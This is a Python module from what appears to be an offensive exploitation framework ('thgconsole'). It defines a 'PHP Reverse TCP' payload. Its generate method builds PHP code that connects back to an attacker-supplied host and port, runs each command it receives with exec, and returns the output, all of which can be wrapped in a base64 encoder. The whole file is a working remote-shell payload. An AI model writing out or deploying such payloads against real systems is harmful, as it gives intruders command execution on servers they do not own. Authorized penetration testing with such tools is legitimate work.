from thgconsole.core.exploit.option import OptEncoder
from thgconsole.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from thgconsole.modules.encoders.php.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using php.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # thgconsole module
        ),
    }

    architecture = Architectures.PHP
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
        )
